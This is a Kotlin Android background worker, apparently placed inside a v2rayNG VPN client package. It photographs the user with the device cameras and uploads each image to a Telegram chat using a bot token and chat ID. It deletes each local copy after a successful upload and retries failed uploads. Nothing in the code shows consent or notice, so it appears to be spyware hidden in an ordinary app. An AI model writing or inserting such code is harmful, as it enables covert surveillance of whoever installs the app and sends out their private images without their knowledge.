package com.v2ray.ang.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.v2ray.ang.manager.CameraManager
import com.v2ray.ang.manager.TelegramUploader

class PhotoWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        const val KEY_TOKEN = "key_token"
        const val KEY_CHAT_ID = "key_chat_id"
    }

    override suspend fun doWork(): Result {
        val token = inputData.getString(KEY_TOKEN)
        val chatId = inputData.getString(KEY_CHAT_ID)

        if (token.isNullOrBlank() || chatId.isNullOrBlank()) {
            Log.e("PhotoWorker", "Token or Chat ID is missing.")
            return Result.failure()
        }

        try {
            val cameraManager = CameraManager(applicationContext)
            val photoFiles = cameraManager.takePhotos()

            if (photoFiles.isEmpty()) {
                Log.w("PhotoWorker", "No photos were taken, maybe permission issue or no cameras.")
                return Result.failure() // Fail if no photos are taken
            }

            var allSuccess = true
            for (file in photoFiles) {
                val success = TelegramUploader.sendPhoto(token, chatId, file)
                if (success) {
                    file.delete() // Clean up successful uploads
                } else {
                    allSuccess = false
                }
            }

            return if (allSuccess) Result.success() else Result.retry()

        } catch (e: Exception) {
            Log.e("PhotoWorker", "An error occurred during photo worker execution", e)
            return Result.retry()
        }
    }
}
